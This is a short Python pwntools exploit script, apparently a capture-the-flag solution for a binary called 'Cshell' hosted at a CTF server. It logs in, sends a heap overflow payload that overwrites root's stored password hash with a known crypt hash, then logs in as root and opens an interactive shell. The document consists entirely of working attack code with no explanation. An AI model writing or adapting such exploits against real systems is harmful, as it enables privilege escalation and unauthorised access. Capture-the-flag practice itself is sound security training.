from pwn import * 

BIN = "./Cshell"

top_heap = 0x5186b0 
username = b"malwar3"
pswd = b"s4db0iz"
crypt_pass = b"13uA68F2TJ9vI"

def exploit():
	io.recvuntil("> ")
	io.sendline(username)
	io.recvuntil("> ")
	io.sendline(pswd)
	io.recvuntil("> ")
	io.sendline(b"120")
	payload = b"a"*187 + crypt_pass
	io.recvuntil("> ")
	io.sendline(payload)
	io.recvuntil("Choice > ")
	io.sendline(b"1")
	io.recvuntil("Username:")
	io.sendline("root")
	io.recvuntil("Password:")
	io.sendline(pswd)
	io.recvuntil("Choice >")
	io.sendline(b"3")
	io.interactive()


io = remote("pwn.be.ax", 5001)
#io = process(BIN)
exploit()